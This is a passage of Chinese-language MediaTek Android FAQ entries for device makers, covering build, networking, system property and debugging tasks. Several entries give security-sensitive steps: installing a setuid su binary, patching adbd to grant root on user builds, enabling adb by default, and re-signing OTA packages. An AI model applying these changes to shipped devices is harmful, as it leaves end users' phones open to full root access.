[SOLUTION] 
修改文件recovery.cpp 如下处：

#endif
    fprintf(stdout, "write result : remove_mota_file\n");
    if (update_package) {
        remove_mota_file(update_package);
    }
把 if 语句及其下一行code注释掉即可！
```

## [net]  [FAQ11124]  确定哪个APK在偷流量的方法

```text
手机在平时的待机中，经常会看到用户并没有主动发起访问网络的操作
但是查看数据流量统计，还是会看到有增长
这个时候就需要去定位当前到底是哪些APK当前有在偷跑流量
[SOLUTION] 
1. 从复现问题的mobile log包中的main log里，找对应的System.out: [socket]  [**]  connenet这样的发起socket 连接的log
并记住黄色标记的那个数字，这个数字就是访问网络的那个APK的进程号:
02-26 09:56:39.096   742   840 I System.out: [socket]  [4]  connection /189.247.134.104:443;LocalPort=50607(20000)

2. mobile log包中的events log里，搜索步骤一中黄色标记的那个数字的相关log
其中tag为am_proc_start代表的就是AMS启动该进程的地方，方括号里的第四个参数代表的就是742这个进程的APK的包名，从包名就可以定位到当前这个第三方的APK了。
02-25 09:56:30.948   477   701 I am_proc_start: [0,742,10012,com.google.process.location,service,com.google.android.location/.NetworkLocationService] 
```

## [net]  [FAQ02951]  wifi Rssi与信号等级的修改

```text
Android中，当RSSI <= -100时，信号level 为0, 当RSSI >=-55为满格信号,level为4，每个level之间的Rssi的跳变为15。
[SOLUTION] 
如果想要修改Rssi与信号等级的对应关系，请直接将
WifiManager.java中的calculateSignalLevel()函数中将level与RSSI之间的对应关系修改即可。
```

## [BT]  [FAQ03557]  [Settings] 修改蓝牙设备的默认名称

```text
在JB以前的版本：
修改frameworks\base\core\jni\Android_bluetooth_common.h
将BTMTK_ANDROID_DEFAULT_LOCAL_NAME值改掉，注意此处有引号。
#define BTMTK_ANDROID_DEFAULT_LOCAL_NAME "ANDROID BT"
 
在JB上的版本：
可以通过修改/mediatek/config/common/custom.conf里面的 bluetooth.HostName = ANDROID BT
来实现修改名称的目的。
```

## [FAQ12128]  如何进入安全模式

```text
长按 power 键关机菜单再长按就可以进入。
开机按 power + volume down 也可以进入。
开机检测是否要进入 safe mode，详见 WindowManagerService.java 中的 detectSafeMode()。
```

## [FAQ05169]  [Storage] 如何从手机上readback任意分区的image回来?

```text
以读回userdata分区为例来说明详细的步骤：
1. 查看MT65XX_Android_scatter_emmc.txt中USRDATA  和其下一个Partition的StartAddress, 如URSDATA =0x425e4000，FAT=0x626e4000
2. 计算出Userdata 的Size =0x626e4000-0x425e4000 = 0x20100000
note:此方法不适用于最后一个有效分区。例：FAT分区或者当没有FAT分区时的userdata分区。最后一个分区size可参考cat /proc/dumchar_inof的值。
3. 使用flash tool 中的Read back 功能添加一个读取image项，并双击设置Start Address 和 Length .其中start address写入 0x425e4000，length写入 0x20100000。
4. 单击 Read back ，并连接手机读取data数据。
5. 如Image 读出来之后为EXT4 的image 格式，请参考《FAQ04247 如何解压编译生成的system/data等带ext4文件系统的image 》来对其进行分析。
```

## [FAQ11663]  KK版本使用JAVA接口修改WIFI MAC地址后，打开WIFI，MAC地址不变

```text
[FAQ06283]  [Legacy Wi-Fi] APK读写WIFI MACaddress方法
参数FAQ接口可以使用对NVRAM进行读写，以前版本读写后，重新打开WIFI，
WIFI高级选项中会显示重新写入的MAC地址，但是KK版本无效，需要重新开机

[SOLUTION] 
KK版本，WIFI高级菜单新增了随时扫描选项，如果勾选了，开关WIFI
实际并没有真正关闭WIFI功能，MAC地址还是没有改变，需要重新开机。
需要去除随时扫描选项，打开WIFI，MAC才会重新从NVRAM读取
```

## [net]  [FAQ06283]  [Legacy Wi-Fi] APK读写WIFI MAC address方法

```text
MAC address是保存在NVRAM里面的，APK也可以通过调用接口进行读写。
alps/mediatek/packages/apps/cdsinfo/src/com/mediatek/connectivity/CdsWifiInfoActivity.java文件
updateMacAddr中有读写MAC address的DEMO
```

## [FAQ12018]  待机，主菜单及锁屏界面背景在设置墙纸是否可以分开设置

```text
android 并不支持此功能,
如果要做到类似的效果, 应该可以采取如下方案
1: 壁纸仍然只有一个,在 idle 界面看到的是壁纸
2: 至于锁屏壁纸, 可以单独去给锁屏设置 background 图片, 在锁屏界面,看到的是它的 background,而非壁纸.锁屏的 view 对应的文件是 KeyguardHostView.java, 即需要给 KeyguardHostView 设置背景图片.
3: 主菜单界面同样采用背景图片的方式, 主菜单的 view 对应的文件是 AppsCustomizeTabHost.java, 即需要给 AppsCustomizeTabHost 设置背景图片
 
因背景图片会占用较多内存, 建议不宜过多设置.
```

## [FAQ11064]  新增Keyguard layout资源放在哪个目录?

```text
需要在锁屏中新增一个UI相关的自定义layout，编译OK，但运行时报错，举例如下:
AndroidRuntime: android.content.res.Resources$NotFoundException: Resource ID #0x1090033
如何去解决呢?
[SOLUTION] 
1. log中报Resource ID #0x1090033找不到，那这个resource ID实际是0x01090033，注意要在0x后面加一个0.
   然后在out\target\common\R\com\android\internal\R.java中找到0x01090033代表的资源名，如果该资源是一个layout，则参考第2步。
 
2. 确认layout文件放置路径正确，新增锁屏layout资源需要同时支持横屏和竖屏。有两种添加方法：
   1）添加在frameworks\base\core\res\res\layout\路径下。
   2）添加在frameworks\base\core\res\res\layout-land 和 frameworks\base\core\res\res\layout-port两个路径下。
```

## [clock]  [FAQ10458]  如何使锁屏界面的日期按照设置中的日期格式显示

```text
google default设计下，锁屏上日期是“EEE, MMMM d”固定格式显示。如果需要根据设置--》日期和时间--》选择日期格式来改变，可参考这个修改方法。
 
[SOLUTION] 
1. default设计，从KeyguardStatusView.java中refreshDate()中可以看到mDateFormatString是一个固定的常量，所以keyguard日期格式是固定的。
2. 如果要修改的话，可以在KeyguardStatusView.java中仿照ClockView.java写一个FormatChangeObserver类, 然后在updateTime()方法中根据setting中日期格式化字串更新日期。
3. 获取setting中设置的日期格式化字串方式如下：
java.text.DateFormat shortDateFormat = DateFormat.getDateFormat(mContext);
CharSequence dateValue = shortDateFormat.format(details.date);
```

## [FAQ08686]  怎样添加或者修改一个kconfig ?

```text
第一种方式：
a、在Kconfig文件添加/修改一个Kconfig 选项 ：
    在 mediatek/platform/<platform>/kernel/Kconfig/*  配置一个Kconfig选项，
    例如：config MTK_TEST
            bool  "test item"
            default y
            ---help---
              for test
b、为添加的Kconfig 选项设置其值：
    在 mediatek/config/<platform>/autoconfig/kconifg/platform or mediatek/config/<project>/autoconfig/kconifg/project添加kconfig选项的值，
    例如：CONFIG_MTK_TEST=y  表示build into kernel
    
    然后就可以在文件中使用该选项：例，在mediatek/kernel/drivers/test/Makefile 中
    obj - $(CONFIG_MTK_TEST) +=test.o
 
第二种方式：
    使用make menuconfig ，来配置kernel的选项

a、首先通过下面的方式进入menuconfig, 在project 下输入：
    cd kernel
    TARGET_PRODUCT=<project> make menuconfig
    在弹出的窗口后，enter  < / > 进入查找窗口，输入要查找的kernel feature名称
    查到该feature后，选择开启或者关闭该feature， 保存，退出menuconfig
 
b、 完成上述配置后，将.config复制到mediatek/config/$project/autoconfig/kconfig/目录下并重命名为project
    然后进行编译kernel
```

## [make]  [FAQ08753]  如何查看某个宏定义的含义

```text
请参 http://dcc.mediatek.com上的Feature_Option_Info_Table_n.xlsx，查看最新的xls即可。
```

## [知识点]  [make]  [FAQ09190]  apk里的so库如何摆放

```text
在android APK的根目录有一个libs文件夹，此文件夹下包含了armeabi 和armeabi-v7a两个文件夹，我们的c代码编译成的本地库（各种.so）就会放在这两个文件夹其中的一个。
那armeabi-v7a 与armeabi有什么区别，该将so库放哪个文件夹?

[KEYWORD] 
armeabi
lib库
apk

[SOLUTION] 
armeabi和armeabi-v7a是表示cpu的类型，我们知道一般的手机或平板都是用arm的cpu，不同的cpu的特性不一样，
armeabi     就是针对普通的或旧的arm cpu
armeabi-v7a 是针对有浮点运算或高级扩展功能的arm cpu
这两个目录都可以放，具体要看开发的apk的定位，如果想将apk发布到网络上供不同的机器使用，那么建议用armeabi（兼容性好），如果只是自己平台上用，则可以用armeabi-v7a
```

## [CMD]  [FAQ03732]  如何压缩代码并共享

```text
解压代码包后，里面有很多linux的软链接并且编译后也会生成很多软链接，如何将代码复制给其他人，并且也可以正常编译很重要。
禁止以下方法压缩软件：
1. 不能在windows下用压缩软件压缩或用复制粘贴的方式
2. 不能再linux下用右键压缩的方法压缩代码
以上方式都是使链接失效
 
[SOLUTION] 
正确的方法是：tar czfv <project_name>.tar.gz alps
其中<project_name>为任意名字，最好是项目+版本的命名方式
alps为源代码目录，已当前要压缩的目录为准
```

## [OTA]  [FAQ03534]  [Recovery] 如何给OTA升级包重新签章

```text
某些OTA升级包需要重新签名
 
[SOLUTION] 
 
在alps目录下，如下command做签章动作：
java -Xmx1024m -jar out/host/linux-x86/framework/signapk.jar -w build/target/product/security/releasekey.x509.pem build/target/product/security/releasekey.pk8 ~/NEWOTA/update.zip ~/NEWOTA/update_with_new_key.zip
 
NOTE:releasekey为您要使用的新签章。
```

## [FAQ03437]  [Recovery] special factory reset preserve or restore apk to /data/app

```text
首先您需在DCC上下载文档《Android SD upgrade application note》来了解special factory reset。
 
一、factory reset preserve /data/app/*.apk
以Notification1.apk、Notification2.apk、Notification3.apk为例
 
详细步骤：
1、在alps\mediatek\config\project_name\ProjectConfig.mk中找到MTK_SPECIAL_FACTORY_RESET，把它设为yes；
2、在alps\vendor\mediatek\project_name\artifacts\out\target\product\project_name\下创建data目录，然后在data目录下创建app目录
3、将Notification1.apk、Notification2.apk、Notification3.apk放入alps\vendor\mediatek\project_name\artifacts\out\target\product\project_name\data\app目录中
4、在vendor\mediatek\project_name\artifacts\out\target\product\project_name\data\app目录下创建 .keep_list 文件，.keep_list 文件的内容为：
/data/app/Notification1.apk
/data/app/Notification2.apk
/data/app/Notification3.apk
 
PS:多个apk的话，每个apk占一行.
5. 重新new
 
二、factory reset restore /system/somewhere/*.apk to /data/app
 
详细步骤：
1、在alps\mediatek\config\project_name\ProjectConfig.mk中找到MTK_SPECIAL_FACTORY_RESET，把它设为yes；
2、在alps\vendor\mediatek\project_name\artifacts\out\target\product\project_name\system下创建appbackup目录
3、将Notification1.apk、Notification2.apk、Notification3.apk放入alps\vendor\mediatek\project_name\artifacts\out\target\product\project_name\system\appbackup目录中
4、在vendor\mediatek\project_name\artifacts\out\target\product\project_name\system\app路径下创建.restore_list文件，.restore_list文件的内容为:
 
/system/appbackup/Notification1.apk
/system/appbackup/Notification2.apk
/system/appbackup/Notification3.apk
 
PS:多个apk的话，每个apk占一行.
5. 重新new
```

## [Dialer]  [FAQ11526]  [COMMON] modem版本如何实现通话DTMF检测功能

```text
1. 在aud_speech.c文件中函数aud_speech_on里添加如下：

void aud_speech_on(kal_uint8 rat_mode) {
   ...
    L1SP_Speech_On(rat_mode);
    aud_context_p->speech_on = KAL_TRUE;
    aud_keytone_detect_start();//xxx add
    ...
}

void aud_speech_off(void) {
    ...
    aud_keytone_detect_stop();//xxx add
    L1SP_Speech_Off();
    aud_context_p->speech_on = KAL_FALSE;
    ...
}

2. 在aud_keytone.c文件中添加函数

//xxx add
void aud_keytone_detect_start(void) {
    /*----------------------------------------------------------------*/
    /* Local Variables                                                */
    /*----------------------------------------------------------------*/
    kal_uint32 result = MED_RES_OK;

    /*----------------------------------------------------------------*/
    /* Code Body                                                      */
    /*----------------------------------------------------------------*/
    KtDetectStart(aud_keytone_detect_callback);
}

void aud_keytone_detect_stop(void) {
    /*----------------------------------------------------------------*/
    /* Local Variables                                                */
    /*----------------------------------------------------------------*/
     KtDetectStop();
}
//xxx add end

3. 在aud_main.h中将定义的这两个函数
extern void aud_keytone_detect_start(void);//xxx add
extern void aud_keytone_detect_stop(void);//xxx add

4. 在void aud_keytone_detect_callback(kal_int16 key)函数里添加trace，可以把key值打印出来，看看是否和按键匹配，
void aud_keytone_detect_callback(kal_int16 key) {
    /*----------------------------------------------------------------*/
    /* Local Variables                                                */
    /*----------------------------------------------------------------*/
    media_aud_kt_process_callback_struct *ind_p = NULL;

    /*----------------------------------------------------------------*/
    /* Code Body                                                      */
    /*----------------------------------------------------------------*/
    ind_p = (media_aud_kt_process_callback_struct*)
    construct_local_para(sizeof(media_aud_kt_process_callback_struct), TD_CTRL);
    ind_p->key = key;
     kal_prompt_trace(MOD_MED,"~~~key = %d",key);
    aud_send_ilm(MOD_MED, MSG_ID_MEDIA_AUD_KT_PROCESS_CALLBACK, ind_p, NULL);

}
打印log，就能看到是否有按键按下，如果需要对特殊按键做处理，可以在该回调函数里做对应的处理.
```

## [FAQ11618]  打开应用提示不能在已root手机使用

```text
总结来看，一般这些应用会做以下三个方面的检查：
1. 判断是否有/system/app/Superuser.apk
2. 判断是否有/system/xbin/su
3. 判断ro.build.tags的值是否为"test-keys"
如果以上三个条件某一个满足，则会被判定为手机已被root，即不符合它的安全要求而不能正常使用。

ps: ro.build.tags默认设置为"test-keys"，而在user版本需要（建议）更改为"release-keys"或其它需要的值
```

## [FAQ09369]  如何查看系统的memory swap 资讯/信息

```text
对于LCA 版本，通常有打开swap config, 那如何查看系统的memory swap 资讯呢?
[Solution] 
1. 整个系统的memory swap 资讯，可以直接读取/proc/meminfo 的资讯，其中有两行:
SwapTotal:            xxxx kB
SwapFree:             yyyy kB
 
2. 某个process 的memory swap 资讯，可以读取/proc/{PID}/status 的资讯，其中有:
VmPeak:   480944 kB
VmSize:   480936 kB
VmLck:         0 kB
VmPin:         0 kB
VmHWM:     19180 kB
VmRSS:     19180 kB
VmData:    12352 kB
VmStk:       136 kB
VmExe:         8 kB
VmLib:     35656 kB
VmPTE:        96 kB
VmSwap:        xxx kB
VmSwap 即当时的swap memory

查看 swap 信息有什么用???
```

## [FAQ09536]  如何在java/native层修改一个文件的权限(mode)与用户(owner)?

```text
如何在java/native层修改一个文件的权限(mode),用户(owner),组(group)，以满足安全需要?
 
[Solution] 
在native 层:
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
 
//chmod/fchmod 用来更新访问权限
int chmod(const char *path, mode_t mode);
int fchmod(int fildes, mode_t mode);
 
//chown/fchown/lchown 用来更新文件owner 和 group
int chown(const char *path, uid_t owner, gid_t group);
int fchown(int fd, uid_t owner, gid_t group);
int lchown(const char *path, uid_t owner, gid_t group);
 
//用来读取文件元数据
int stat(const char *path, struct stat *buf);
int fstat(int filedes, struct stat *buf);
int lstat(const char *path, struct stat *buf);
 
更多的资讯可以在linux 中 man chmod ; man chown ; man stat
 
在java 层:
java default 并不提供这样的功能，android 为满足内部需要，在android.os.FileUtils 类中提供了setPermissions 方法，结合了chmod 与chown. 参数中mode 即chmod 参数中的mode，当不需要设置file 的uid 和 group 时，可将uid 和 gid 都设置成-1；
android.os.FileUtils
public static native int setPermissions(String file, int mode, int uid, int gid);
```

## [FAQ09494]  如果确认一个 process 所拥有的root 权限(capabilities)

```text
linux 将root 权限分割成一个一个的capabilities，如何查看每个process 所拥有的root capabilities?
 
[Keyword] 
root process capabilities 
 
[Solution] 
从adb shell 命令操作中，我们可以:
adb shell cat proc/PID/status其中会打印.

比如对于system server:
CapInh: 0000000000000000
CapPrm: 0000000007c13c20
CapEff: 0000000007c13c20
CapBnd: ffffffffffffffff
 
比如对于zygote & init 等root process：
CapInh: 0000000000000000
CapPrm: ffffffffffffffff
CapEff: ffffffffffffffff
CapBnd: ffffffffffffffff
即包含原始的任何的capabilities.
 
而对于普通的app process:
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: ffffffffffffffff
即任何的root 的capabilities 都被剥夺了。
 
从native 层操作，即可使用capget 函数获取相关的资讯，具体函数的使用可以man capget 获取函数使用方法。
从kernel 层即可直接读取task 中的struct cred 结构体，然后读取其资讯，如:
const struct cred * cred = __task_cred(task);
然后就可直接读取相关的数据了 , 具体可以参考kernel/fs/proc/array.c 中的task_cap 函数
```

## [FAQ09272]  如何从手机，代码工程，运行环境 MTKLOG 中获取android 的版本(version)信息

```text
1. 直接从手机上查看
   我们可以从设置(Settings)-> 关于手机(About phone) -> Android version 得知该资讯
   
2. 从代码工程中查看
   在alps/build/core/version_defaults.mk 中有定义两个关键的属性
   PLATFORM_VERSION : Android 系统版本，通常为一个x.y.z 的字符串
   PLATFORM_SDK_VERSION : Android 系统对应的SDK 版本 为一个整数
   
   这两个值，在编译完后将会放置在system/build.prop 中，分别对应ro.build.version.release ， ro.build.version.sdk
   
3. 运行环境
    命令行操作: 
        查看android 版本: adb shell getprop ro.build.version.release  
        查看SDK 版本:     adb shell getprop ro.build.version.sdk
 执行代码:
        可以读取system property ro.build.version.release 和 ro.build.version.sdk
        从JAVA 代码可以直接访问下面的两个字段:
        android.os.Build.VERSION.RELEASE
        android.os.BUILD.VERSION.SDK_INT
  
4. MTKLOG
   在android 4.1 以及以前版本，MTKLOG ->mobile log->AP LOG 中有一个versions 文件; 在android 4.1 之后，改名成properties 文件。对应里面存储了系统的相关system property ，可以直接读取中，分别对应ro.build.version.release ， ro.build.version.sdk
```

## [FAQ09021]  如何修改系统内置文件的权限, 用户，属性

```text
修改系统内置文件的权限，通常分成三种方式:
1). 在打包成image 时，就已经修改/定制/调整好；
2). 在开机时强制性更新；
3). 开机后，通过命令操作的方式修改，通常仅仅用于有root 权限时的debug 操作，或者借助root 权限强制性调用相关的API
针对正式版本，明显第三种方式不合适，前两种方式中，第一种方式在打包image 时直接处理比较好(推荐使用)，而开机时处理无疑会拉长处理的开机的时间(只是执行速度块，影响比较小)
 
下面分别说明这三种方式:

第一种方式: 打包成image 时处理
在将系统文件打包成image 时，相关的权限，用户，属性配置项都定义在alps/system/core/inlcude/private/android_filesystem_config.h 中
在该文件中包括三个关键的定义:
1) 系统用户的定义，即不同的用户对应不同的user id
2) 系统目录权限定义，即android_dirs 数组
3) 系统特别文件权限定义， 即android_files 数组
如果您需要增加特别的目录权限定义，可以放置在android_dirs 定义中; 如果您需要增加特别文件权限的定义，可以增加在android_files 数组中。
注意的是增加的特别权限设置要在广泛设置之前。
    { 06755, AID_ROOT,      AID_ROOT,      0, "system/xbin/su" },
要放在
    { 00755, AID_ROOT,      AID_SHELL,     0, "system/xbin/*" },
之前
 
第二种方式: 在开机时强制性更新
System 文件夹在init.rc 中被描述为 ro (read only)， 即被mount 成ro, 所以即使您再去chmod or chown 某个文件的权限或者所有者，都无法达到目的。
目前system image 会mount 两次，您必须在system 被remount 成ro 前修改文件权限方可。
针对yaffs2 文件系统(其他文件系统类似)，您要增加的代码须放置在:
on fs
# mount mtd partitions
write /proc/bootprof "INIT:NAND:Mount_START"
# Mount /system rw first to give the filesystem a chance to save a checkpoint
mount yaffs2 mtd@system /system nandboot
mkdir /system/secro 0600 system system
# RIL need to do this before the folder /system changed to read only
chown radio system /system/etc/ril
chmod 0770 /system/etc/ril
chmod 0444 /system/etc/ril/oper.lis

#Add your code here...
mount yaffs2 mtd@system /system ro remount nandboot
mount yaffs2 mtd@userdata /data nosuid nodev nandboot
mount yaffs2 mtd@cache /cache nosuid nodev nandboot
write /proc/bootprof "INIT:NAND:Mount_END"

第三种方式: 命令方式修改
下面以将一个su 内置到system/xbin 进行说明 
adb remount 《= 调整system image 的mount 方式rw:read-write
adb push su system/xbin 《= push 到system/xbin
adb shell chmod 6755 system/xbin/su 《= 更新文件权限，并设置s bit
```

## [prop]  [FAQ08008]  普通APP APK 如何确认系统是MTK 平台

```text
有一些APP 厂商，可能针对MTK 平台进行优化设计，那么普通APP 如何确认系统是MTK 平台呢?
目前在手机运行系统中，要能够直接判断是MTK 系统，可以读取下面的system property.
Java API
android.os.SystemProperties
public String get(String key);
public String get(String key, String def);
 
可以读取下面的三个MTK 平台独有的system property， 有即是MTK 平台了，并且可以获取具体的MTK 平台释放资讯。
ro.mediatek.platform          对应MTK IC， 注意不区分2G，3G， 如MT6575/MT6515 都统一会是MT6575
ro.mediatek.version.branch    对应MTK 内部branch， 如ALPS.ICS.MP, ALPS.ICS2.MP, ALPS.JB.MP 等之类
ro.mediatek.version.release   对应MTK 内部branch 的释放版本，如ALPS.ICS.MP.V2.47, ALPS.JB2.MP.V1.9
 
如ICS2 75 的手机
[ro.mediatek.platform] : [MT6575] 
[ro.mediatek.version.branch] : [ALPS.ICS.MP] 
[ro.mediatek.version.release] : [ALPS.ICS.MP.V2.47] 
 
JB2.MP 89 的手机
[ro.mediatek.platform] : [MT6589] 
[ro.mediatek.version.branch] : [ALPS.JB2.MP] 
[ro.mediatek.version.release] : [ALPS.JB2.MP.V1.9] 
 
下面是一个demo 的util java class.
 
import android.os.SystemProperties;
/**
* A simple util demo for Mediatek Platform Information
*/
public class MediatekPlatformUtil{
 
  public static final String MTK_PLATFORM_KEY = "ro.mediatek.platform";
  public static final String MTK_VERSION_BRANCH_KEY = "ro.mediatek.version.branch";
  public static final String MTK_VERSION_RELEASE_KEY = "ro.mediatek.version.release";
 
  /**
   * Check is or not Mediatek platfrom 
   */
  public static boolean isMediatekPlatform(){
    String platform = SystemProperties.get(MTK_PLATFORM_KEY);
    return platform != null && (platform.startsWith("MT") || platform.startsWith("mt"));
  }
 
  /**
   * Get the Mediatek Platform information, such as MT6589, MT6577.....
   * @Warning It does not distinguish between 2G and 3G IC. IE. MT6515, MT6575 => MT6575
   */
  public static String getMediatekPlatform(){
    return SystemProperties.get(MTK_PLATFORM_KEY);
  }
 
  /**
   * Get the mediatek version information.
   * Return a string array with two elements. first element is branch, and the second is release version.
   */
  public static String[]  getMediatekVersion(){
    String[]  result = new String[2] ;
    result[0]  = SystemProperties.get(MTK_VERSION_BRANCH_KEY);
    result[1]  = SystemProperties.get(MTK_VERSION_RELEASE_KEY);
    return result;
  }
}
```

## [prop]  [FAQ07367]  如何设置系统属性 systemproperty 默认值

```text
system property 是存在在init 进程中的关键系统属性，如系统安全，系统稳定性，系统的版本信息等，system property 容量有限，不能随意添加与设置。
设置system property 的默认值通常可以分成2种:
1. 在build 的时候即填写好，然后保存在手机系统中(/default.prop system/build.prop 等)。
default.prop 中的属性属于系统安全属性，通常请下严禁在运行时修改，有build 时的变量 ADDITION_DEFAULT_PROPERTIES 产生，如ro.secure, ro.debuggable 等。
具体可以参考alps/build/core/main.mk 中这个ADDITION_DEFAULT_PROPERTIES变量的设置。

system/build.porp 中的属性称为常规属性，由build 时的变量 ADDITION_BUILD_PROPERTIES 产生，通常可以在如alps/build/tools/buildinfo.sh, 
alps/mediatek/config/project-name/system.prop 中添加，或者直接修改ADDITION_BUILD_PROPERTIES 变量；建议在system.prop 中添加。

2. 在系统启动的时候强制性添加，通常是在init process 启动，并且property service 已经初始化后，通过配置init.rc 写入，使用的命令是
setprop key value 的方式设置。

建议采用第一种方式进行设置，以便维护
 
[相关FAQ] 
FAQ04349: 不能添加system property, 提示： permission denied uid:xxxxx  name:xxxxx
FAQ03994: system property 写入/更新后，马上读取无效问题
FAQ03778: 如何对system property 进行扩容 
FAQ06739: system property 设置失败的可能性分析和初步诊断
```

## [prop]  [FAQ03994]  system property 写入/更新后，马上读取无效问题

```text
首先说明一下system property 的使用API
Java API
android.os.SystemProperties
public String get(String key);
public String get(String key, String def);
public int getInt(String key, int def);
public long getLong(String key, long def);
public void set(String key, String val); => the return value is void
 
Native API
libcutils/Properties.h & Properties.c
int property_set(const char* key, const char* value);
int property_get(const char* key, char* value, const char* def);
int property_list(void(*propfn)(const char* key, const char* value, void * cookie), void * cookie);
 
Android Toolbox
adb shell getprop
    return all properties, as list
adb shell getprop <key>
    return the property base on key
adb shell setprop <key> <value>
    set the property <key> <-> <value>
 
Init.rc
setprop <key> <value>
on property:<key>=<value>
     some actions.
 
Android 2.3 版本，其他process 写入system properties 时，只是通过socket 将其发送到init 的system properties，然后直接返回；而至于init 什么时候读取socket 中的message, 然后update/write system properties, 这个还不得而知，所以可能产生不可推断的延时。
Android 4.0 版本后，init 的properties_service update 完后才去关闭socket， 而其他process wait socket closed 后才返回，这个wait time 最长为250ms, 即如果init 延时的时间超过250ms, 将强制返回。原则上从Android 4.0 后，可以规避掉绝大部分写入后不能马上读取出来的情况。
另外一个方面，read 是直接通过memory mmap 的方式，直接在对应的process 中直接读取，无需透过socket 请求init 读取。从而就可能出现时间差，即写入后无法即时读取的情况。相比2.3版本 4.0 版本之后出现的概率要大大的降低。
```

## [FAQ04776]  如何默认打开user版本 debug 选项, 默认打开adb 连接

```text
1. 在android 4.0 之前，这个设置是在frameworks/base/service/..../SystemServer.java 里面设置会根据system property 的persist.service.adb.enable 来设置。您可以看到类似如代码：
        // make sure the ADB_ENABLED setting value matches the secure property value
        Settings.Secure.putInt(mContentResolver, Settings.Secure.ADB_ENABLED,
                "1".equals(SystemProperties.get("persist.service.adb.enable")) ? 1 : 0);
        // register observer to listen for settings changes
        mContentResolver.registerContentObserver(Settings.Secure.getUriFor(Settings.Secure.ADB_ENABLED),
                false, new AdbSettingsObserver());
    
 而这个persist.service.adb.enable 默认是放在在default.prop 中，在编译的时候在build/core/main.mk 中确认, 
 ifeq (true,$(strip $(enable_target_debugging)))
   # Target is more debuggable and adbd is on by default
   ADDITIONAL_DEFAULT_PROPERTIES += ro.debuggable=1 persist.service.adb.enable=1
   # Include the debugging/testing OTA keys in this build.
   INCLUDE_TEST_OTA_KEYS := true
 else # !enable_target_debugging
   # Target is less debuggable and adbd is off by default
   ADDITIONAL_DEFAULT_PROPERTIES += ro.debuggable=0 persist.service.adb.enable=0 
 endif # !enable_target_debugging
 您需要将: ADDITIONAL_DEFAULT_PROPERTIES += ro.debuggable=0 persist.service.adb.enable=0  改成
 ADDITIONAL_DEFAULT_PROPERTIES += ro.debuggable=1 persist.service.adb.enable=1 
    
2. 在android 4.0 之后，因为adb 的控制，统一使用了persist.sys.usb.config 来控制，于是对应的设置点也改到了frameworks/base/service/...../usb/UsbDeviceManager.java 中，您也可以看到类似的代码如：
public  UsbHandler(Looper looper) {
        // persist.sys.usb.config should never be unset.  But if it is, set it to "adb"
        // so we have a chance of debugging what happened.
         mDefaultFunctions = SystemProperties.get("persist.sys.usb.config", "adb");
        // sanity check the sys.usb.config system property
        // this may be necessary if we crashed while switching USB configurations
        String config = SystemProperties.get("sys.usb.config", "none");
        if (!config.equals(mDefaultFunctions)) {
            Slog.w(TAG, "resetting config to persistent property: " + mDefaultFunctions);
            SystemProperties.set("sys.usb.config", mDefaultFunctions);
        }
        mCurrentFunctions = mDefaultFunctions;
        String state = FileUtils.readTextFile(new File(STATE_PATH), 0, null).trim();
        updateState(state);
        mAdbEnabled = containsFunction(mCurrentFunctions, UsbManager.USB_FUNCTION_ADB);
public void  systemReady() {
 // make sure the ADB_ENABLED setting value matches the current state
    Settings.Secure.putInt(mContentResolver, Settings.Secure.ADB_ENABLED, mAdbEnabled ? 1 : 0);
 
而这个persist.sys.usb.config 中adb 的配置是在alps/build/tools/post_process_props.py 中根据ro.debuggable = 1 or 0 来设置，1 就是开启adb, 0 即关闭adb debug. 而这个ro.debuggable 也是在alps/build/core/main.mk 中设置，和2.3 修改类似
不过您这样打开之后，对于user 版本adb shell 开启的还是shell 权限，而不是root 权限，如果您需要root 权限，需要再改一下system/core/adb/adb.c 里面的should_drop_privileges() 这个函数，在#ifndef ALLOW_ADBD_ROOT 时return 0; 而不是return 1; 即可。
```

## [debug]  [FAQ08893]  如何抓取app 进程的hprof

```text
在分析app 时，我们通常需要分析app 的java heap 资料，如分析java 的memory leak, 追查heap 中相关变量情况等。
在android 中抓取app 的hprof 操作方式有下面几种:
第一种方式: 使用am 命令 
adb shell am dumpheap {Process} file
如 adb shell am dumpheap com.android.phone /data/anr/phone.hprof
adb pull /data/anr/phone.hprof

第二种方式: 使用DDMS 命令
在DDMS 中选择对应的process, 然后在Devices 按钮栏中选择Dump Hprof file， 保存即可

第三种方式: 通过代码的方式
在android.os.Debug 这个class 中有定义相关的抓取hprof 的method.
如: public static void dumpHprofData(String fileName) throws IOException;
这样即可在代码中直接将这个process 的hprof 保存到相对应的文件中，注意这个只能抓取当时的process.
如果想抓其他的process 的hprof, 那么就必须通过AMS 帮忙了。
可以先获取IActivityManager 接口，然后调用它的dumpheap 方法。具体的代码，大家可以参考
frameworks/base/cmds/am/src/com/android/commands/am/am.java 中的调用代码

抓取回hprof 后，就可以用hprof-conv 命令将DVM 格式的hprof 转换成标准的java 命令的hprof
hprof-conv in.hprof out.hprof

然后使用如MAT 之类的工具进行具体的分析
```

## [CMD]  [FAQ08150]  如何快速确认文件系统空间使用情况

```text
1. df 命令 显示各个分区文件使用情况
root@android:/ # df
df
Filesystem             Size   Used   Free   Blksize
/dev                   237M    52K   237M   4096
/mnt/secure            237M     0K   237M   4096
/mnt/asec              237M     0K   237M   4096
/mnt/obb               237M     0K   237M   4096
/system                640M   427M   213M   4096
/data                    1G   183M     1G   4096
/cache                 370M     6M   364M   4096
/protect_f               8M     4M     4M   4096
/protect_s               8M     4M     4M   4096
/mnt/cd-rom             17M    17M     0K   2048
/storage/sdcard0         1G     1G   118M   16384
/mnt/secure/asec         1G     1G   118M   16384
 
2. du 命令查询目录占用空间
usage: du [-H | -L | -P]  [-a | -d depth | -s]  [-cgkmrx]  [file ...] 
具体可以在linux 上直接man du 查看使用手法
举例如去追查/data 分区
root@android:/ # du -d 1 /data
du -d 1 /data
8       /data/lost+found
133328  /data/app
53352   /data/data
8       /data/app-private
84768   /data/dalvik-cache
8       /data/anr
8       /data/dontpanic
32      /data/drm
1104    /data/local
16      /data/agps_supl
16      /data/ssh
16      /data/mdl
1024    /data/nvram
8       /data/resource-cache
256     /data/misc
38040   /data/app-lib
8       /data/amit
8       /data/user
1392    /data/system
8       /data/app-asec
8       /data/acdapi
24      /data/media
32      /data/backup
144     /data/property
80      /data/@btmtk
32      /data/cust
8       /data/SF_dump
8       /data/tombstones
8       /data/aee_exp
8       /data/core
324088  /data
 
这样确定是某个目录xxx_dir占用量最大，最有嫌疑，然后再进一步
du -d 1 /data/xxx_dir
 
